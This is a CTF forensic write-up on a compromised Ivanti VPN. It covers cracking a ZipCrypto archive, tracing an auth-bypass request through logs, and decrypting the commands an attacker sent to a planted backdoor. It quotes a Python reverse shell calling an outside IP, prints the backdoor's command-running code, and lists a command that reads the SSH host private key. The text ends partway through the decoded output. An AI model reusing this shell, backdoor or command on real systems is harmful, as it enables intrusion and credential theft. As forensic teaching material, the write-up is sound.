<!DOCTYPE html>
<html lang="en">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> FCSC 2024 - Horreur, Malheur serie - Forensic | Cyberrzzerk</title>
  <link rel = 'canonical' href = 'https://-lb.fr/posts/fcsc-2024-horreur-malheur-serie-forensic/'>
  <meta name="description" content="Writing some write up of cool CTFâ€™s challenges and infosec content.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="FCSC 2024 - Horreur, Malheur serie - Forensic" />
<meta property="og:description" content="Introduction You&rsquo;ve just been hired as Information Systems Security Manager (ISSM) for a strategic company.
When you arrive at your office on your first day, you realise that your predecessor has left you a USB stick with a note on it: VPN compromised (integrity). Version 22.3R1 b1647.
Note: The first part (Encrypted Archive) unlocks the other parts, with the exception of the second part (Initial Access) which can be processed independently." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://-lb.fr/posts/fcsc-2024-horreur-malheur-serie-forensic/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-04-14T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-04-14T00:00:00+00:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="FCSC 2024 - Horreur, Malheur serie - Forensic"/>
<meta name="twitter:description" content="Introduction You&rsquo;ve just been hired as Information Systems Security Manager (ISSM) for a strategic company.
When you arrive at your office on your first day, you realise that your predecessor has left you a USB stick with a note on it: VPN compromised (integrity). Version 22.3R1 b1647.
Note: The first part (Encrypted Archive) unlocks the other parts, with the exception of the second part (Initial Access) which can be processed independently."/>

  
  
    
  
  

 
<link rel="stylesheet" href="../../css/style.css"> 

  
<link rel="stylesheet" href="../../css/custom.css">  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://-lb.fr/images/favicon.ico" />

  
  
  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="../../index.html">Home</a></li>
    
        <li><a href="../index.html">Categories</a></li>
      
        <li><a href="../../ranking/index.html">Ranking</a></li>
      
        <li><a href="../../whoami/index.html">Whoami</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://-lb.fr/posts/fcsc-2024-illuminated-misc/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://-lb.fr/posts/fcsc-2024-fifty-shades-of-white-reverse/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&text=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&title=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&is_video=false&description=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic&body=Check out this article: https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&title=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&title=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&name=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic&description=Introduction%20You%26rsquo%3bve%20just%20been%20hired%20as%20Information%20Systems%20Security%20Manager%20%28ISSM%29%20for%20a%20strategic%20company.%0aWhen%20you%20arrive%20at%20your%20office%20on%20your%20first%20day%2c%20you%20realise%20that%20your%20predecessor%20has%20left%20you%20a%20USB%20stick%20with%20a%20note%20on%20it%3a%20VPN%20compromised%20%28integrity%29.%20Version%2022.3R1%20b1647.%0aNote%3a%20The%20first%20part%20%28Encrypted%20Archive%29%20unlocks%20the%20other%20parts%2c%20with%20the%20exception%20of%20the%20second%20part%20%28Initial%20Access%29%20which%20can%20be%20processed%20independently." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f-lb.fr%2fposts%2ffcsc-2024-horreur-malheur-serie-forensic%2f&t=FCSC%202024%20-%20Horreur%2c%20Malheur%20serie%20-%20Forensic" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#15---encrypted-archive">1/5 - Encrypted archive</a></li>
    <li><a href="#25---initial-access">2/5 - Initial access</a></li>
    <li><a href="#35---simple-persistence">3/5 - Simple persistence</a></li>
    <li><a href="#45---simple-persistence">4/5 - Simple persistence</a></li>
    <li><a href="#55---a-little-cti">5/5 - A little CTI</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        FCSC 2024 - Horreur, Malheur serie - Forensic
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2024-04-14 00:00:00 &#43;0000 UTC" itemprop="datePublished">2024-04-14</time>
          
        </div>
        
        
        <div class="article-read-time">
          <i class="far fa-clock"></i>
          
          7 minute read
        </div>
        
        
        <div class="article-category">
            <i class="fas fa-archive"></i>
            
            
            <a class="category-link" href="/../../categories/fcsc2024/index.html">FCSC2024</a>
            
        </div>
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="../../tags/ctf/index.html" rel="tag">CTF</a>
            
             ,  
            <a class="tag-link" href="../../tags/forensic/index.html" rel="tag">Forensic</a>
            
             ,  
            <a class="tag-link" href="../../tags/cti/index.html" rel="tag">CTI</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <h2 id="introduction">Introduction</h2>
<blockquote>
<p>You&rsquo;ve just been hired as Information Systems Security Manager (ISSM) for a strategic company.</p>
<p>When you arrive at your office on your first day, you realise that your predecessor has left you a USB stick with a note on it: VPN compromised (integrity). Version 22.3R1 b1647.</p>
<p>Note: The first part (Encrypted Archive) unlocks the other parts, with the exception of the second part (Initial Access) which can be processed independently. We recommend that you work through the parts in order.</p>
</blockquote>
<h2 id="15---encrypted-archive">1/5 - Encrypted archive</h2>
<blockquote>
<p>On the USB key, you find two files: an encrypted archive and the equipment logs. You start by listing the contents of the archive, for which you don&rsquo;t know the password. You keep in mind an article you&rsquo;ve read: it seems that the packages installed on the equipment are not up to date&hellip; The flag is the password for the archive. Note: The password is long and random, so there&rsquo;s no point in trying to brute-force it.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ zipinfo archive.zip                                                   ok | 03:27:47 PM 
</span></span><span style="display:flex;"><span>Archive:  archive.zip
</span></span><span style="display:flex;"><span>Zip file size: <span style="color:#ae81ff">65470</span> bytes, number of entries: <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>-rw-r--r--  3.0 unx    <span style="color:#ae81ff">64697</span> BX defN 24-Mar-15 14:58 tmp/temp-scanner-archive-20240315-065846.tgz
</span></span><span style="display:flex;"><span>-rwxr-xr-x  3.0 unx      <span style="color:#ae81ff">194</span> TX defN 22-Dec-05 16:06 home/VERSION
</span></span><span style="display:flex;"><span>-rw-r--r--  3.0 unx       <span style="color:#ae81ff">33</span> TX defN 24-Mar-15 14:32 data/flag.txt
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> files, <span style="color:#ae81ff">64924</span> bytes uncompressed, <span style="color:#ae81ff">64842</span> bytes compressed:  0.1%
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ 7z l -slt archive.zip
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Method <span style="color:#f92672">=</span> ZipCrypto Deflate
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>The archive is encrypted with Linux&rsquo;s default <code>zip</code> utility, which uses the <code>ZipCrypto</code> algorithm. This algorithm is vulnerable to a <a href="https://link.springer.com/chapter/10.1007/3-540-60590-8_12">known-clear attack</a>.</p>
<p>The <a href="https://github.com/kimci86/bkcrack">bkcrack</a> tool can be used to exploit this flaw. You still need to have at least 12 known bytes to hope to exploit it.</p>
<p>The headers of <code>.tgz</code> archives have bytes that are too variable, and we don&rsquo;t know the contents of <code>flag.txt</code>(ORLY?). We still need to find out what is in the <code>home/VERSION</code> file. This is common in Ivanti products, so let&rsquo;s search with a dork.</p>
<p><img src="/images/FCSC2024/60047e9ebab4630628bf0e031f447e27.png" alt="image"></p>
<p>The <a href="https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce">first article</a> contains a cat from <code>/home/VERSION</code> which seems to correspond to the version of our product. <code>22.3R1 b1647</code>.</p>
<p><img src="/images/FCSC2024/a83708c7fe3180920132cea9922033c6.png" alt="image"></p>
<p>Now we can prepare to attack:
<img src="/images/FCSC2024/4bb2f2b32d5dfeeeede46ccfc247bd60.png" alt="image"></p>
<p>We find a set of possible keys, we can try to create a copy of the archive with the password we want.</p>
<p><img src="/images/FCSC2024/67f1c6423d5d54b29bdfd6e3e81f42ef.png" alt="image"></p>
<h2 id="25---initial-access">2/5 - Initial access</h2>
<blockquote>
<p>On the USB key, you find two files: an encrypted archive and the equipment logs. You now focus your attention on the logs. As the device has been compromised, you need to find the vulnerability used by the attacker and the attacker&rsquo;s IP address. The flag is in the format: FCSC{CVE-XXXX-XXXXX:&lt;IP_address&gt;}.</p>
</blockquote>
<p>The dork used to find the right file gives us many clues.</p>
<p>The article tells us that the vulnerability involves exploiting the API point <code>/api/v1/totp/user-backup-code/</code> to bypass authentication. Let&rsquo;s check our logs.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cd data/var/dlogs
</span></span><span style="display:flex;"><span>$ grep -l <span style="color:#e6db74">&#39;/api/v1/totp/user-backup-code/&#39;</span> *
</span></span><span style="display:flex;"><span>config_rest_server.log.old
</span></span><span style="display:flex;"><span>$ cat config_rest_server.log.old
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid: 6299|app: 0|req: 1/1<span style="color:#f92672">]</span> 172.18.0.4 <span style="color:#f92672">()</span> <span style="color:#f92672">{</span><span style="color:#ae81ff">30</span> vars in <span style="color:#ae81ff">501</span> bytes<span style="color:#f92672">}</span> <span style="color:#f92672">[</span>Fri Mar <span style="color:#ae81ff">15</span> 06:29:17 2024<span style="color:#f92672">]</span> POST /api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection <span style="color:#f92672">=</span>&gt; generated <span style="color:#ae81ff">14</span> bytes in <span style="color:#ae81ff">164281</span> msecs <span style="color:#f92672">(</span>HTTP/1.1 200<span style="color:#f92672">)</span> <span style="color:#ae81ff">2</span> header
</span></span></code></pre></div><p>Searching for the POST request, we come across <a href="https://www.splunk.com/en_us/blog/security/security-insights-investigating-ivanti-connect-secure-auth-bypass-and-rce.html">this Splunk article</a> which indicates the CVE used.</p>
<p>The IP address is not that of the attacker but that of the router, so the search doesn&rsquo;t stop there. The <code>nodemon.log</code> file contains a list of active processes. The first <a href="https://www.assetnote.io/resources/research/high-signal-detection-and-exploitation-of-ivantis-pulse-connect-secure-auth-bypass-rce">AssetNode</a> article indicates the use of a reverse-shell. If we look a little further we find :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c import socket,subprocess;s<span style="color:#f92672">=</span>socket.socket<span style="color:#f92672">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#f92672">)</span>;s.connect<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;20.13.3.0&#34;</span>,4444<span style="color:#f92672">))</span>;subprocess.call<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span><span style="color:#f92672">]</span>,stdin<span style="color:#f92672">=</span>s.fileno<span style="color:#f92672">()</span>,stdout<span style="color:#f92672">=</span>s.fileno<span style="color:#f92672">()</span>,stderr<span style="color:#f92672">=</span>s.fileno<span style="color:#f92672">())</span>
</span></span></code></pre></div><h2 id="35---simple-persistence">3/5 - Simple persistence</h2>
<blockquote>
<p>You have managed to decrypt the archive. It would appear that this archive contains another archive, which contains the result of the equipment integrity check script.</p>
<p>Using this last archive and the logs, you are now looking for traces of persistence deposited and used by the attacker.</p>
</blockquote>
<p>Here we begin to suspect that the challenge is based on known operating modes, especially if we have made the link with HAFNIUM on SOC Simulator. When looking for the CVE we come across an article from <a href="https://www.mandiant.com/resources/blog/investigating-ivanti-zero-day-exploitation">Mandiant</a> which talks about the vulnerability.</p>
<p>UNC5221 uses a custom web-shell which it places in the <code>CAV</code> python tool. Let&rsquo;s see if it&rsquo;s present.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ tar xvfz tmp_scan_archive_dec.tgz
</span></span><span style="display:flex;"><span>home/bin/configencrypt
</span></span><span style="display:flex;"><span>home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg
</span></span><span style="display:flex;"><span>$ 7z x cav-0.1-py3.6.egg
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Everything is Ok      
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Files: <span style="color:#ae81ff">66</span>
</span></span><span style="display:flex;"><span>Size:       <span style="color:#ae81ff">144421</span>
</span></span><span style="display:flex;"><span>Compressed: <span style="color:#ae81ff">70497</span>
</span></span><span style="display:flex;"><span>$ cat cav/api/resources/health.py
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> simplejson <span style="color:#66d9ef">as</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Cryptodome.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Cryptodome.Util.Padding <span style="color:#f92672">import</span> pad, unpad
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> request
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_restful <span style="color:#f92672">import</span> Resource
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Health</span>(Resource):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Handles requests that are coming for client to post the application data.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/data/flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> handle:
</span></span><span style="display:flex;"><span>                dskey <span style="color:#f92672">=</span> handle<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;cmd&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> data:
</span></span><span style="display:flex;"><span>                aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(dskey<span style="color:#f92672">.</span>encode(), AES<span style="color:#f92672">.</span>MODE_ECB)
</span></span><span style="display:flex;"><span>                cmd <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>decompress(aes<span style="color:#f92672">.</span>decrypt(base64<span style="color:#f92672">.</span>b64decode(data)))
</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>getoutput(cmd)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(result, bytes): result <span style="color:#f92672">=</span> str(result)<span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>                result <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(aes<span style="color:#f92672">.</span>encrypt(pad(zlib<span style="color:#f92672">.</span>compress(result), <span style="color:#ae81ff">32</span>)))<span style="color:#f92672">.</span>decode()        
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> result, <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> str(e), <span style="color:#ae81ff">501</span>
</span></span></code></pre></div><p>The <code>/health</code> endpoint therefore takes a <code>cmd</code> argument which it executes as a <code>bash</code> command. Let&rsquo;s look for calls to this endpoint in our logs:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cd data/var/dlogs
</span></span><span style="display:flex;"><span>$ grep -l <span style="color:#e6db74">&#39;health?cmd=&#39;</span> *
</span></span><span style="display:flex;"><span>cav_webserv.log
</span></span><span style="display:flex;"><span>$ grep <span style="color:#e6db74">&#39;health?cmd=&#39;</span> cav_webserv.log | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">18</span>                       
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>DjrB3j2wy3YJHqXccjkWidUBniQPmhTkHeiA59kIzfA%3D
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>K/a6JKeclFNFwnqrFW/6ENBiq0BnskUVoqBf4zn3vyQ%3D
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ%3D%3D
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>Lmrbj2rb7SmCkLLIeBfUxTA2pkFQex/RjqoV2WSBr0EyxihrKLvkqPKO3I7KV1bhm8Y61VzkIj3tyLKLgfCdlA%3D%3D
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>yPfHKFiBi6MxfKlndP99J4eco1zxfKUhriwlanMWKE3NhhHtYkSOrj4QZhvf6u17fJ%2B74TvmsMdtYH6pnvcNZOq3JRu2hdv2Za51x82UYXG1WpYtAgCa42dOx/deHzAlZNwM7VvCZckPLfDeBGZyLHX/XP4spz4lpfau9mZZ%2B/o%3D
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>E1Wi18Bo5mPNTp/CaB5o018KdRfH2yOnexhwSEuxKWBx7%2Byv4YdHT3ASGAL67ozaoZeUzaId88ImfFvaPeSr6XtPvRqgrLJPl7oH2GHafzEPPplWHDPQQUfxsYQjkbhT
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>7JPshdVsmVSiQWcRNKLjY1FkPBh91d2K3SUK7HrBcEJu/XbfMG9gY/pTNtVhfVS7RXpWHjLOtW01JKfmiX/hOJQ8QbfXl2htqcppn%2BXeiWHpCWr%2ByyabDservMnHxrocU4uIzWNXHef5VNVClGgV4JCjjI1lofHyrGtBD%2B0nZc8%3D
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>WzAd4Ok8kSOF8e1eS6f8rdGE4sH5Ql8injexw36evBw/mHk617VRAtzEhjXwOZyR/tlQ20sgz%2BJxmwQdxnJwNg%3D%3D
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>G9QtDIGXyoCA6tZC6DtLz89k5FDdQNe2TfjZ18hdPbM%3D
</span></span><span style="display:flex;"><span>/api/v1/cav/client/health?cmd<span style="color:#f92672">=</span>QV2ImqgrjrL7%2BtofpO12S9bqgDCRHYXGJwaOIihb%2BNI%3D
</span></span></code></pre></div><p>It&rsquo;s possible to use CyberChef here, but that&rsquo;s how I did it:</p>
<p>Clean up a bit and URL decode the commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ grep <span style="color:#e6db74">&#39;health?cmd=&#39;</span> cav_webserv.log | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">18</span> | cut -d <span style="color:#e6db74">&#39;=&#39;</span> -f <span style="color:#ae81ff">2</span> | urldec &gt; cmds_dec
</span></span></code></pre></div><p><code>urldec</code> is an alias on <code>python3 -c &quot;import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read())));&quot;</code>.</p>
<p>We modify the backdoor script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Copyright (c) 2018 by Pulse Secure, LLC. All rights reserved</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> simplejson <span style="color:#66d9ef">as</span> json
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Cryptodome.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Cryptodome.Util.Padding <span style="color:#f92672">import</span> pad, unpad
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;cmds_dec&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> data <span style="color:#f92672">in</span> f:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flagdec&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> handle:
</span></span><span style="display:flex;"><span>                dskey <span style="color:#f92672">=</span> handle<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> data:
</span></span><span style="display:flex;"><span>                aes <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(dskey<span style="color:#f92672">.</span>encode(), AES<span style="color:#f92672">.</span>MODE_ECB)
</span></span><span style="display:flex;"><span>                cmd <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>decompress(aes<span style="color:#f92672">.</span>decrypt(base64<span style="color:#f92672">.</span>b64decode(data)))
</span></span><span style="display:flex;"><span>                print(cmd)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>            print(str(e))
</span></span></code></pre></div><p>result</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;id&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;ls /&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;echo FCSC{[REDACTED]}&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;cat /data/runtime/etc/ssh/ssh_host_rsa_key&#39;</span>
